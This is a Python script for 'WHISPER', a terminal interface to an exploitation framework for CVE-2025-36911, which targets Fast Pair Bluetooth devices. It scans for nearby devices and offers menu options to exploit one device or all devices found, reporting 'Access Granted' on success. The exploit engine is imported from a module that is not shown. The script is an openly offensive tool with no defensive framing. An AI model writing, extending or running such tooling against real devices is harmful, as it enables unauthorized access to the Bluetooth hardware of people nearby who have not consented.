#!/usr/bin/env python3
"""
WHISPER - Streamlined Terminal Interface
CVE-2025-36911 Exploitation Framework - Clean Edition
"""

import asyncio
import os
import sys
import json
import time
import re
from datetime import datetime
from typing import List, Optional

# Add current directory to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

try:
    from fast_pair_exploit import FastPairExploitEngine, FastPairDevice
    ENGINE_AVAILABLE = True
except ImportError:
    ENGINE_AVAILABLE = False

class WhisperTerminal:
    def __init__(self):
        self.engine = FastPairExploitEngine() if ENGINE_AVAILABLE else None
        self.current_devices: List[FastPairDevice] = []
        self.running = True
        self.last_scan_time = None
        
        self.COLOR = {
            'RED': '\033[91m', 'GREEN': '\033[92m', 'YELLOW': '\033[93m',
            'BLUE': '\033[94m', 'CYAN': '\033[96m', 'RESET': '\033[0m', 'BOLD': '\033[1m'
        }

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def print_banner(self):
        banner = f"""{self.COLOR['CYAN']}{self.COLOR['BOLD']}
██╗    ██╗██╗  ██╗██╗███████╗██████╗ ███████╗██████╗ 
██║    ██║██║  ██║██║██╔════╝██╔══██╗██╔════╝██╔══██╗
██║ █╗ ██║███████║██║███████╗██████╔╝█████╗  ██████╔╝
██║███╗██║██╔══██║██║╚════██║██╔═══╝ ██╔══╝  ██╔══██╗
╚███╔███╔╝██║  ██║██║███████║██║     ███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝{self.COLOR['RESET']}"""
        print(banner)

    def display_main_menu(self):
        self.clear_screen()
        self.print_banner()
        print(f"\n{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
        print(f" 1. Scan | 2. Target | 3. Exploit Specific | 4. Exploit All | 0. Exit")
        print(f"{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
        return input(f"\n{self.COLOR['CYAN']}Command > {self.COLOR['RESET']}").strip()

    async def handle_scan(self):
        print(f"\n{self.COLOR['YELLOW']}Scanning...{self.COLOR['RESET']}")
        self.current_devices = await self.engine.scan_devices(20)
        self.last_scan_time = datetime.now().strftime("%H:%M:%S")
        for i, d in enumerate(self.current_devices, 1):
            print(f"[{i}] {d.name} - {d.address} ({d.vulnerability_status})")
        input("\nPress Enter...")

    async def handle_exploit(self, all_devices=False):
        targets = self.current_devices if all_devices else []
        if not all_devices:
            idx = int(input("Device index: ")) - 1
            targets = [self.current_devices[idx]]
        
        for device in targets:
            print(f"\n{self.COLOR['RED']}Exploiting {device.name}...{self.COLOR['RESET']}")
            results = await self.engine.exploit_device(device.address, device.name)
            if results.get("success"):
                print(f"{self.COLOR['GREEN']}Access Granted: {results.get('exploit_result')}{self.COLOR['RESET']}")
        input("\nDone. Press Enter...")

    async def run(self):
        if os.geteuid() != 0:
            print("Run as root.")
            return
            
        while self.running:
            choice = self.display_main_menu()
            if choice == "1": await self.handle_scan()
            elif choice == "3": await self.handle_exploit(False)
            elif choice == "4": await self.handle_exploit(True)
            elif choice == "0": self.running = False

if __name__ == "__main__":
    asyncio.run(WhisperTerminal().run())
